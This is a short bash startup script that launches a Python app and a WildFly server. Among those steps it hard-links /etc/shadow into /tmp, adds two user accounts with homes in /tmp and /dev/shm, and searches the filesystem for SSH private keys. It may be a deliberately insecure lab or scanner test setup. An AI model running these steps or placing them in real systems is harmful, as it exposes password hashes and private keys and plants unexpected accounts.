#!/bin/bash
/usr/local/bin/python3 /bin/myapp.py &
ln /etc/shadow /tmp/shadow
useradd -d /dev/shm/test test
useradd -d /tmp/test2 test2
find / -name "id_rsa" -print
find / -name "id_dsa" -print
/opt/wildfly/bin/standalone.sh